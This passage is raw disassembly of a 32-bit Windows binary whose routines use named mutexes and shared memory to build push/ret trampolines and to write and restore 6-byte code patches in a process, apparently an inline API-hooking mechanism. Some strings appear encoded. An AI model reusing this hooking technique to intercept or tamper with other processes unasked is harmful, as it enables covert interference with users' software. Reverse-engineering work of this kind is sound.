		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	[ebp+lpBaseAddress], eax
		cmp	[ebp+lpBaseAddress], 0
		jz	loc_40FC74
		mov	eax, [ebp+lpBaseAddress]
		mov	eax, [eax]
		mov	[ebp+var_40], eax
		mov	eax, [ebp+var_40]
		mov	eax, [eax+4]
		mov	edx, [ebp+var_40]
		cmp	eax, [edx]
		jnz	loc_40FC74
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40FC09
		push	0
		mov	eax, [ebp+var_40]
		mov	eax, [eax+4]
		add	eax, eax
		shl	eax, 3
		add	eax, 1Ch
		push	eax
		call	sub_40A770
		mov	ebx, eax
		jmp	short loc_40FC1E
; ---------------------------------------------------------------------------

loc_40FC09:				; CODE XREF: sub_40F0A4+B49j
		mov	eax, [ebp+var_40]
		mov	eax, [eax+4]
		add	eax, eax
		shl	eax, 3
		add	eax, 1Ch
		call	sub_40CA74
		mov	ebx, eax

loc_40FC1E:				; CODE XREF: sub_40F0A4+B63j
		mov	eax, [ebp+var_40]
		mov	ecx, [eax+4]
		shl	ecx, 3
		add	ecx, 1Ch
		mov	edx, ebx
		mov	eax, [ebp+lpBaseAddress]
		mov	eax, [eax]
		call	sub_402664
		mov	eax, [ebp+var_40]
		mov	eax, [eax+4]
		add	eax, eax
		mov	[ebx+4], eax
		mov	eax, [ebp+lpBaseAddress]
		mov	eax, [eax]
		mov	[ebp+var_28], eax
		mov	eax, [ebp+lpBaseAddress]
		mov	[eax], ebx
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40FC64
		push	0
		mov	eax, [ebp+var_28]
		push	eax
		call	sub_40A890
		jmp	short loc_40FC74
; ---------------------------------------------------------------------------

loc_40FC64:				; CODE XREF: sub_40F0A4+BB1j
		push	8000h		; dwFreeType
		push	0		; dwSize
		mov	eax, [ebp+var_28]
		push	eax		; lpAddress
		call	VirtualFree_0

loc_40FC74:				; CODE XREF: sub_40F0A4+A28j
					; sub_40F0A4+A5Aj ...
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+24h], 0
		jnz	loc_40FDE4
		test	byte ptr [ebp+arg_0], 1
		jnz	loc_40FD46
		mov	eax, [ebp+var_4]
		mov	eax, [eax+20h]
		add	eax, 0Ah
		mov	edx, [ebp+var_4]
		mov	[edx+28h], eax
		xor	ebx, ebx

loc_40FC9C:				; CODE XREF: sub_40F0A4+C2Fj
		mov	eax, ebx
		shl	eax, 3
		sub	eax, ebx
		mov	edx, [ebp+var_4]
		mov	edx, [edx+28h]
		lea	eax, [edx+eax*2]
		mov	byte ptr [eax],	68h
		xor	edx, edx
		mov	[eax+1], edx
		mov	byte ptr [eax+5], 0F0h
		mov	word ptr [eax+6], 2583h
		lea	edx, [eax+1]
		mov	[eax+8], edx
		mov	byte ptr [eax+0Ch], 0
		mov	byte ptr [eax+0Dh], 0C3h
		inc	ebx
		cmp	ebx, 118h
		jnz	short loc_40FC9C
		mov	eax, [ebp+var_4]
		mov	eax, [eax+28h]
		add	eax, 0F50h
		mov	ebx, eax
		mov	edx, ebx
		mov	eax, offset dword_40E8F0
		mov	ecx, [ebp+var_3C]
		call	sub_402664
		mov	eax, [ebp+var_3C]
		push	eax
		push	0
		push	0
		push	0FFFFFFFFh
		mov	eax, offset dword_410020
		mov	ecx, 4
		mov	edx, ebx
		call	sub_405A30
		add	eax, ebx
		mov	edx, [ebp+var_4]
		mov	edx, [edx+28h]
		mov	[eax], edx
		mov	eax, [ebp+var_3C]
		push	eax
		push	0
		push	0
		push	0FFFFFFFFh
		mov	eax, offset dword_410028
		mov	ecx, 4
		mov	edx, ebx
		call	sub_405A30
		add	eax, ebx
		mov	edx, [ebp+var_4]
		mov	edx, [edx+10h]
		sub	edx, ebx
		sub	edx, [ebp+var_3C]
		mov	[eax], edx
		mov	eax, [ebp+var_4]
		mov	[eax+10h], ebx

loc_40FD46:				; CODE XREF: sub_40F0A4+BE1j
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	loc_40FDE4
		push	0
		push	22h
		call	sub_40A770
		mov	edx, [ebp+var_4]
		mov	[edx+1Ch], eax
		mov	eax, [ebp+var_4]
		mov	eax, [eax+1Ch]
		mov	edi, eax
		mov	esi, offset dword_416AE4
		mov	ecx, 8
		rep movsd
		movsw
		mov	eax, offset dword_410038
		call	sub_409880
		mov	edx, [ebp+var_4]
		mov	edx, [edx+1Ch]
		inc	edx
		add	edx, 5
		sub	eax, edx
		mov	edx, [ebp+var_4]
		mov	edx, [edx+1Ch]
		mov	[edx+2], eax
		call	GetCurrentProcessId
		mov	edx, [ebp+var_4]
		mov	ebx, [edx+1Ch]
		mov	[ebx+7], eax
		lea	eax, [ebx+14h]
		mov	[ebx+10h], eax
		mov	eax, [ebp+var_4]
		mov	eax, [eax+10h]
		mov	[ebx+14h], eax
		lea	eax, [ebx+1Eh]
		mov	[ebx+1Ah], eax
		lea	eax, [ebx+1Eh]
		mov	edx, [ebp+var_4]
		mov	edx, [edx+20h]
		mov	[edx+2], eax
		mov	eax, [ebp+var_4]
		mov	eax, [eax+1Ch]
		push	eax
		call	GetCurrentProcessId
		push	eax
		call	GetCurrentProcess
		mov	edx, [ebp+var_4]
		mov	ecx, [edx+8]
		pop	edx
		call	sub_40E480

loc_40FDE4:				; CODE XREF: sub_40F0A4+BD7j
					; sub_40F0A4+CA9j
		mov	eax, [ebp+var_4]
		mov	eax, [eax+20h]
		mov	edx, [ebp+var_4]
		mov	edx, [edx+14h]
		mov	[edx], eax
		mov	eax, [ebp+lpBaseAddress]
		mov	eax, [eax]
		mov	edx, [eax]
		mov	ecx, [eax+edx*8+14h]
		mov	[eax+edx*8+1Ch], ecx
		mov	ecx, [eax+edx*8+18h]
		mov	[eax+edx*8+20h], ecx
		mov	edx, [ebp+var_4]
		cmp	byte ptr [edx+0Ch], 0
		jz	short loc_40FE29
		mov	edx, [ebp+var_4]
		cmp	byte ptr [edx+24h], 0
		jnz	short loc_40FE29
		mov	edx, [eax]
		mov	ecx, [ebp+var_4]
		mov	ecx, [ecx+1Ch]
		mov	[eax+edx*8+14h], ecx
		jmp	short loc_40FE35
; ---------------------------------------------------------------------------

loc_40FE29:				; CODE XREF: sub_40F0A4+D6Cj
					; sub_40F0A4+D75j
		mov	edx, [eax]
		mov	ecx, [ebp+var_4]
		mov	ecx, [ecx+10h]
		mov	[eax+edx*8+14h], ecx

loc_40FE35:				; CODE XREF: sub_40F0A4+D83j
		mov	edx, [eax]
		mov	ecx, [ebp+var_4]
		mov	ecx, [ecx+20h]
		mov	ecx, [ecx+2]
		mov	[eax+edx*8+18h], ecx
		mov	edx, [eax]
		mov	ecx, [eax+edx*8+1Ch]
		mov	edx, [eax+edx*8+18h]
		mov	[edx], ecx
		mov	edx, [eax]
		mov	ecx, [eax+edx*8+14h]
		mov	edx, [eax+edx*8+10h]
		mov	[edx], ecx
		inc	dword ptr [eax]
		mov	eax, [ebp+var_4]
		mov	byte ptr [eax+4], 1
		mov	eax, [ebp+var_4]
		call	sub_41004C
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40FE91

loc_40FE7A:				; CODE XREF: sub_40F0A4+DEBj
		cmp	[ebp+lpBaseAddress], 0
		jz	short loc_40FE89
		mov	eax, [ebp+lpBaseAddress]
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile

loc_40FE89:				; CODE XREF: sub_40F0A4+DDAj
		retn
; ---------------------------------------------------------------------------

loc_40FE8A:				; DATA XREF: sub_40F0A4+8DBo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40FE7A
; ---------------------------------------------------------------------------

loc_40FE91:				; CODE XREF: sub_40F0A4:loc_40FE89j
					; DATA XREF: sub_40F0A4+DD1o
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40FEC7

loc_40FE9E:				; CODE XREF: sub_40F0A4+E21j
		cmp	[ebp+hObject], 0
		jz	short loc_40FEBF
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+5], 0
		jz	short loc_40FEB6
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40FEBF

loc_40FEB6:				; CODE XREF: sub_40F0A4+E07j
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40FEBF:				; CODE XREF: sub_40F0A4+DFEj
					; sub_40F0A4+E10j
		retn
; ---------------------------------------------------------------------------

loc_40FEC0:				; DATA XREF: sub_40F0A4+30Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40FE9E
; ---------------------------------------------------------------------------

loc_40FEC7:				; CODE XREF: sub_40F0A4:loc_40FEBFj
					; DATA XREF: sub_40F0A4+DF5o
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40FEFA

loc_40FED4:				; CODE XREF: sub_40F0A4+E54j
		cmp	[ebp+hMutex], 0
		jz	short loc_40FEE3
		mov	eax, [ebp+hMutex]
		push	eax		; hMutex
		call	ReleaseMutex

loc_40FEE3:				; CODE XREF: sub_40F0A4+E34j
		cmp	[ebp+var_10], 0
		jz	short loc_40FEF2
		mov	eax, [ebp+var_10]
		push	eax		; hMutex
		call	ReleaseMutex

loc_40FEF2:				; CODE XREF: sub_40F0A4+E43j
		retn
; ---------------------------------------------------------------------------

loc_40FEF3:				; DATA XREF: sub_40F0A4+22Co
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40FED4
; ---------------------------------------------------------------------------

loc_40FEFA:				; CODE XREF: sub_40F0A4:loc_40FEF2j
					; DATA XREF: sub_40F0A4+E2Bo
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40FF2D

loc_40FF07:				; CODE XREF: sub_40F0A4+E87j
		cmp	[ebp+hMutex], 0
		jz	short loc_40FF16
		mov	eax, [ebp+hMutex]
		push	eax		; hObject
		call	CloseHandle

loc_40FF16:				; CODE XREF: sub_40F0A4+E67j
		cmp	[ebp+var_10], 0
		jz	short loc_40FF25
		mov	eax, [ebp+var_10]
		push	eax		; hObject
		call	CloseHandle

loc_40FF25:				; CODE XREF: sub_40F0A4+E76j
		retn
; ---------------------------------------------------------------------------

loc_40FF26:				; DATA XREF: sub_40F0A4+1F6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40FF07
; ---------------------------------------------------------------------------

loc_40FF2D:				; CODE XREF: sub_40F0A4:loc_40FF25j
					; DATA XREF: sub_40F0A4+E5Eo
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40FF50

loc_40FF3A:				; CODE XREF: sub_40F0A4+EAAj
		call	sub_40D1F8
		mov	eax, [ebp+dwErrCode]
		push	eax		; dwErrCode
		call	SetLastError
		retn
; ---------------------------------------------------------------------------

loc_40FF49:				; DATA XREF: sub_40F0A4+68o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40FF3A
; ---------------------------------------------------------------------------

loc_40FF50:				; CODE XREF: sub_40F0A4+35Aj
					; sub_40F0A4+696j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40FFA0

loc_40FF5D:				; CODE XREF: sub_40F0A4+EFAj
		lea	eax, [ebp+var_120]
		mov	edx, 0Fh
		call	sub_4039B8
		lea	eax, [ebp+var_E4]
		mov	edx, off_407188
		mov	ecx, 2
		call	sub_4040E8
		lea	eax, [ebp+var_24]
		mov	edx, 3
		call	sub_4039B8
		lea	eax, [ebp+arg_10]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40FF99:				; DATA XREF: sub_40F0A4+4Ao
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40FF5D
; ---------------------------------------------------------------------------

loc_40FFA0:				; CODE XREF: sub_40F0A4+EF4j
					; DATA XREF: sub_40F0A4+EB4o
		mov	eax, [ebp+var_4]
		cmp	[ebp+var_5], 0
		jz	short loc_40FFB8
		call	sub_402E98
		pop	large dword ptr	fs:0
		add	esp, 0Ch

loc_40FFB8:				; CODE XREF: sub_40F0A4+F03j
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	14h
sub_40F0A4	endp

; ---------------------------------------------------------------------------
		dd 0FFFFFFFFh, 3
dword_40FFCC	dd 1D1438h, 0FFFFFFFFh,	5 ; DATA XREF: sub_40F0A4+10Fo
					; sub_40F0A4+123o
dword_40FFD8	dd 30212018h, 2Dh, 0FFFFFFFFh, 2 ; DATA	XREF: sub_40F0A4+16Ao
					; sub_40F0A4+1B2o
dword_40FFE8	dd 202Ch, 0FFFFFFFFh, 0Bh ; DATA XREF: sub_40F0A4+17Ao
					; sub_40F0A4+1C2o ...
dword_40FFF4	dd 3038341Bh, 33201731h, 273033h, 0FFFFFFFFh, 0Ah
					; DATA XREF: sub_40F0A4+247o
					; sub_40F0A4+2AAo ...
dword_410008	dd 0A672622h, 317B6766h, 3939h,	0FFFFFFFFh, 3 ;	DATA XREF: sub_40F0A4+400o
					; sub_40F0A4:loc_40F4D1o
dword_41001C	dd 2D3C38h		; DATA XREF: sub_40F0A4+4FAo
dword_410020	dd 11111111h, 0		; DATA XREF: sub_40F0A4+C57o
dword_410028	dd 22222222h, 0		; DATA XREF: sub_40F0A4+C7Co
		dd 0FFFFFFFFh, 13h
dword_410038	dd 16213012h, 30272720h, 2705213Bh, 2630363Ah, 311C26h
					; DATA XREF: sub_40F0A4+CD4o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41004C	proc near		; CODE XREF: sub_40F0A4+DC4p
					; sub_410F44+A5p

var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
lpBaseAddress	= dword	ptr -14h
hObject		= dword	ptr -10h
hMutex		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFD8h
		push	ebx
		push	esi
		xor	edx, edx
		mov	[ebp+var_24], edx
		mov	[ebp+var_28], edx
		mov	[ebp+var_1C], edx
		mov	[ebp+var_20], edx
		mov	[ebp+var_8], edx
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_4102AD
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+4], 0
		jz	loc_41028A
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+2Ch], 0
		jnz	loc_41028A
		xor	eax, eax
		mov	[ebp+var_18], eax
		lea	eax, [ebp+var_8]
		push	eax
		mov	eax, [ebp+var_4]
		mov	cl, [eax+0Ch]
		mov	eax, [ebp+var_4]
		mov	edx, [eax+8]
		mov	eax, offset dword_4102C4
		call	sub_40C5F8
		lea	edx, [ebp+var_20]
		mov	eax, offset dword_4102D0
		call	sub_4064CC
		push	[ebp+var_20]
		push	offset dword_4102E0
		push	[ebp+var_8]
		lea	eax, [ebp+var_1C]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_1C]
		call	sub_403E24
		push	eax		; lpName
		call	sub_40C210
		mov	[ebp+hMutex], eax
		cmp	[ebp+hMutex], 0
		jz	loc_41028A
		xor	edx, edx
		push	ebp
		push	offset loc_410283
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		push	0FFFFFFFFh	; dwMilliseconds
		mov	eax, [ebp+hMutex]
		push	eax		; hHandle
		call	WaitForSingleObject
		xor	edx, edx
		push	ebp
		push	offset loc_410265
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		push	0FFFFFFFFh
		lea	edx, [ebp+var_28]
		mov	eax, offset dword_4102EC
		call	sub_4064CC
		push	[ebp+var_28]
		push	offset dword_4102E0
		push	[ebp+var_8]
		lea	eax, [ebp+var_24]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_24]
		call	sub_403E24
		push	eax
		call	sub_40C508
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	loc_410229
		xor	edx, edx
		push	ebp
		push	offset loc_410222
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	[ebp+lpBaseAddress], eax
		cmp	[ebp+lpBaseAddress], 0
		jz	loc_41020B
		xor	edx, edx
		push	ebp
		push	offset loc_410204
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		mov	eax, [ebp+lpBaseAddress]
		mov	esi, [eax]
		mov	eax, [esi+0Ch]
		mov	[ebp+var_18], eax
		call	sub_40A9CC
		mov	ebx, eax
		mov	eax, [esi+0Ch]
		mov	edx, 8
		call	sub_40AAAC
		test	al, al
		jz	short loc_4101ED
		mov	edx, [esi+0Ch]
		lea	eax, [esi+16h]
		mov	ecx, 6
		call	sub_40C1B0
		test	al, al
		jnz	short loc_4101DC
		mov	eax, [esi+0Ch]
		mov	edx, [esi+16h]
		mov	[eax], edx
		mov	dx, [esi+1Ah]
		mov	[eax+4], dx

loc_4101DC:				; CODE XREF: sub_41004C+17Ej
		test	bl, bl
		jz	short loc_4101ED
		mov	eax, [esi+0Ch]
		mov	edx, 8
		call	sub_40AB3C

loc_4101ED:				; CODE XREF: sub_41004C+16Aj
					; sub_41004C+192j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_41020B

loc_4101FA:				; CODE XREF: sub_41004C+1BDj
		mov	eax, [ebp+lpBaseAddress]
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile
		retn
; ---------------------------------------------------------------------------

loc_410204:				; DATA XREF: sub_41004C+13Eo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4101FA
; ---------------------------------------------------------------------------

loc_41020B:				; CODE XREF: sub_41004C+135j
					; sub_41004C+1B7j
					; DATA XREF: ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_410229

loc_410218:				; CODE XREF: sub_41004C+1DBj
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle
		retn
; ---------------------------------------------------------------------------

loc_410222:				; DATA XREF: sub_41004C+10Fo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_410218
; ---------------------------------------------------------------------------

loc_410229:				; CODE XREF: sub_41004C+106j
					; sub_41004C+1D5j
					; DATA XREF: ...
		cmp	[ebp+var_18], 0
		jz	short loc_41024E
		mov	eax, [ebp+var_4]
		mov	eax, [eax+8]
		cmp	eax, [ebp+var_18]
		jz	short loc_41024E
		mov	eax, [ebp+var_4]
		mov	edx, [eax+8]
		mov	eax, [ebp+var_4]
		mov	eax, [eax+30h]
		mov	ecx, [ebp+var_18]
		call	sub_40CB00

loc_41024E:				; CODE XREF: sub_41004C+1E1j
					; sub_41004C+1ECj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_41026C

loc_41025B:				; CODE XREF: sub_41004C+21Ej
		mov	eax, [ebp+hMutex]
		push	eax		; hMutex
		call	ReleaseMutex
		retn
; ---------------------------------------------------------------------------

loc_410265:				; DATA XREF: sub_41004C+BFo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_41025B
; ---------------------------------------------------------------------------

loc_41026C:				; CODE XREF: sub_41004C+218j
					; DATA XREF: sub_41004C+20Ao
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_41028A

loc_410279:				; CODE XREF: sub_41004C+23Cj
		mov	eax, [ebp+hMutex]
		push	eax		; hObject
		call	CloseHandle
		retn
; ---------------------------------------------------------------------------

loc_410283:				; DATA XREF: sub_41004C+A6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_410279
; ---------------------------------------------------------------------------

loc_41028A:				; CODE XREF: sub_41004C+31j
					; sub_41004C+3Ej ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4102B4

loc_410297:				; CODE XREF: sub_41004C+266j
		lea	eax, [ebp+var_28]
		mov	edx, 4
		call	sub_4039B8
		lea	eax, [ebp+var_8]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_4102AD:				; DATA XREF: sub_41004C+1Fo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_410297
; ---------------------------------------------------------------------------

loc_4102B4:				; CODE XREF: sub_41004C+260j
					; DATA XREF: sub_41004C+246o
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_41004C	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 3
dword_4102C4	dd 1D1438h, 0FFFFFFFFh,	5 ; DATA XREF: sub_41004C+59o
dword_4102D0	dd 30212018h, 2Dh, 0FFFFFFFFh, 2 ; DATA	XREF: sub_41004C+66o
dword_4102E0	dd 202Ch, 0FFFFFFFFh, 0Bh ; DATA XREF: sub_41004C+73o
					; sub_41004C+DCo
dword_4102EC	dd 3038341Bh, 33201731h, 273033h ; DATA	XREF: sub_41004C+CFo

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4102F8	proc near		; DATA XREF: CODE:0040E8E0o

var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
Buffer		= _MEMORY_BASIC_INFORMATION ptr	-40h
lpAddress	= dword	ptr -24h
hMem		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
lpBaseAddress	= dword	ptr -14h
hObject		= dword	ptr -10h
hMutex		= dword	ptr -0Ch
var_5		= byte ptr -5
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFB0h
		push	ebx
		push	esi
		xor	ecx, ecx
		mov	[ebp+var_4C], ecx
		mov	[ebp+var_50], ecx
		mov	[ebp+var_44], ecx
		mov	[ebp+var_48], ecx
		mov	[ebp+var_18], ecx
		call	sub_402EA8
		mov	[ebp+var_5], dl
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_410796
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+var_4]
		mov	byte ptr [eax+2Ch], 1
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+4], 0
		jz	loc_410750
		xor	eax, eax
		mov	[ebp+hMem], eax
		xor	eax, eax
		mov	[ebp+lpAddress], eax
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_410370
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+24h], 0
		jnz	short loc_410370
		call	GetCurrentProcessId
		mov	edx, [ebp+var_4]
		mov	ecx, [edx+1Ch]
		mov	edx, [ebp+var_4]
		mov	edx, [edx+8]
		call	sub_40E63C

loc_410370:				; CODE XREF: sub_4102F8+57j
					; sub_4102F8+60j
		lea	eax, [ebp+var_18]
		push	eax
		mov	eax, [ebp+var_4]
		mov	cl, [eax+0Ch]
		mov	eax, [ebp+var_4]
		mov	edx, [eax+8]
		mov	eax, offset dword_4107BC
		call	sub_40C5F8
		lea	edx, [ebp+var_48]
		mov	eax, offset dword_4107C8
		call	sub_4064CC
		push	[ebp+var_48]
		push	offset dword_4107D8
		push	[ebp+var_18]
		lea	eax, [ebp+var_44]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_44]
		call	sub_403E24
		push	eax		; lpName
		call	sub_40C210
		mov	[ebp+hMutex], eax
		cmp	[ebp+hMutex], 0
		jz	loc_41064D
		xor	ecx, ecx
		push	ebp
		push	offset loc_410646
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		push	0FFFFFFFFh	; dwMilliseconds
		mov	eax, [ebp+hMutex]
		push	eax		; hHandle
		call	WaitForSingleObject
		xor	ecx, ecx
		push	ebp
		push	offset loc_410628
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		push	0FFFFFFFFh
		lea	edx, [ebp+var_50]
		mov	eax, offset dword_4107E4
		call	sub_4064CC
		push	[ebp+var_50]
		push	offset dword_4107D8
		push	[ebp+var_18]
		lea	eax, [ebp+var_4C]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_4C]
		call	sub_403E24
		push	eax
		call	sub_40C508
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	loc_410611
		xor	ecx, ecx
		push	ebp
		push	offset loc_41060A
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	[ebp+lpBaseAddress], eax
		cmp	[ebp+lpBaseAddress], 0
		jz	loc_4105F3
		xor	ecx, ecx
		push	ebp
		push	offset loc_4105EC
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		mov	eax, [ebp+lpBaseAddress]
		mov	esi, [eax]
		mov	eax, [esi]
		sub	eax, 2
		test	eax, eax
		jle	loc_4105D5
		mov	[ebp+var_1C], 1

loc_410489:				; CODE XREF: sub_4102F8+2D7j
		mov	edx, [ebp+var_4]
		cmp	byte ptr [edx+0Ch], 0
		jz	short loc_4104AA
		mov	edx, [ebp+var_4]
		cmp	byte ptr [edx+24h], 0
		jnz	short loc_4104AA
		mov	edx, [ebp+var_1C]
		mov	edx, [esi+edx*8+1Ch]
		mov	ecx, [ebp+var_4]
		cmp	edx, [ecx+1Ch]
		jz	short loc_4104D3

loc_4104AA:				; CODE XREF: sub_4102F8+198j
					; sub_4102F8+1A1j
		mov	edx, [ebp+var_4]
		cmp	byte ptr [edx+0Ch], 0
		jz	short loc_4104C0
		mov	edx, [ebp+var_4]
		cmp	byte ptr [edx+24h], 0
		jz	loc_4105CB

loc_4104C0:				; CODE XREF: sub_4102F8+1B9j
		mov	edx, [ebp+var_1C]
		mov	edx, [esi+edx*8+1Ch]
		mov	ecx, [ebp+var_4]
		cmp	edx, [ecx+10h]
		jnz	loc_4105CB

loc_4104D3:				; CODE XREF: sub_4102F8+1B0j
		mov	edx, [ebp+var_1C]
		mov	edx, [esi+edx*8+20h]
		mov	ecx, [ebp+var_4]
		mov	ecx, [ecx+20h]
		cmp	edx, [ecx+2]
		jnz	loc_4105CB
		mov	eax, [ebp+var_1C]
		mov	edx, [esi]
		sub	edx, 2
		sub	edx, eax
		jl	short loc_41050A
		inc	edx

loc_4104F6:				; CODE XREF: sub_4102F8+210j
		mov	ecx, [esi+eax*8+24h]
		mov	[esi+eax*8+1Ch], ecx
		mov	ecx, [esi+eax*8+28h]
		mov	[esi+eax*8+20h], ecx
		inc	eax
		dec	edx
		jnz	short loc_4104F6

loc_41050A:				; CODE XREF: sub_4102F8+1FBj
		mov	eax, [ebp+var_1C]
		mov	eax, [esi+eax*8+1Ch]
		mov	edx, [ebp+var_1C]
		mov	edx, [esi+edx*8+18h]
		mov	[edx], eax
		dec	dword ptr [esi]
		cmp	dword ptr [esi], 2
		jnz	loc_4105D5
		cmp	dword ptr [esi+8], 0
		jz	loc_4105D5
		push	6		; ucb
		mov	eax, [esi+0Ch]
		push	eax		; lp
		call	IsBadReadPtr
		test	eax, eax
		jnz	short loc_4105AE
		mov	eax, [esi+0Ch]
		mov	al, [eax]
		cmp	al, [esi+16h]
		jnz	short loc_4105AE
		mov	eax, [esi+0Ch]
		mov	al, [eax+1]
		cmp	al, [esi+17h]
		jnz	short loc_4105AE
		mov	eax, [esi+0Ch]
		mov	eax, [eax+2]
		cmp	eax, [esi+18h]
		jnz	short loc_4105AE
		mov	eax, [esi+0Ch]
		call	sub_40A9CC
		mov	ebx, eax
		mov	eax, [esi+0Ch]
		mov	edx, 8
		call	sub_40AAAC
		test	al, al
		jz	short loc_4105AE
		mov	edx, [esi+0Ch]
		lea	eax, [esi+10h]
		mov	ecx, 6
		call	sub_40C1B0
		test	al, al
		jnz	short loc_41059D
		mov	eax, [esi+0Ch]
		mov	edx, [esi+10h]
		mov	[eax], edx
		mov	dx, [esi+14h]
		mov	[eax+4], dx

loc_41059D:				; CODE XREF: sub_4102F8+293j
		test	bl, bl
		jz	short loc_4105AE
		mov	eax, [esi+0Ch]
		mov	edx, 8
		call	sub_40AB3C

loc_4105AE:				; CODE XREF: sub_4102F8+244j
					; sub_4102F8+24Ej ...
		mov	eax, [esi+24h]
		mov	[ebp+hMem], eax
		mov	eax, [ebp+lpBaseAddress]
		mov	edx, [eax]
		mov	[ebp+lpAddress], edx
		xor	edx, edx
		mov	[eax], edx
		mov	eax, [esi+8]
		push	eax		; hObject
		call	CloseHandle
		jmp	short loc_4105D5
; ---------------------------------------------------------------------------

loc_4105CB:				; CODE XREF: sub_4102F8+1C2j
					; sub_4102F8+1D5j ...
		inc	[ebp+var_1C]
		dec	eax
		jnz	loc_410489

loc_4105D5:				; CODE XREF: sub_4102F8+184j
					; sub_4102F8+227j ...
		xor	eax, eax
		pop	edx
		pop	ecx
